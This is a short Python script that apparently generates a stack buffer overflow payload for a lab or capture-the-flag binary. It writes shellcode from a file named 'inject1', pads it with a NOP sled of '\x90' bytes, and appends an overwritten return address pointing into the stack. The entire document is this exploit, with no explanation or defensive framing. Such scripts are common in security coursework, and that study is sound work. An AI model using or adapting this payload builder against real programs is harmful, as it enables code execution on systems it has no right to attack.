import sys


#sys.stdout.write('\x90' * (79-37))






with open('inject1', 'r') as fin:
    sys.stdout.write(fin.read())

sys.stdout.write('\x90' * (79-37))
sys.stdout.write('\x0d\xd6\xff\xff')

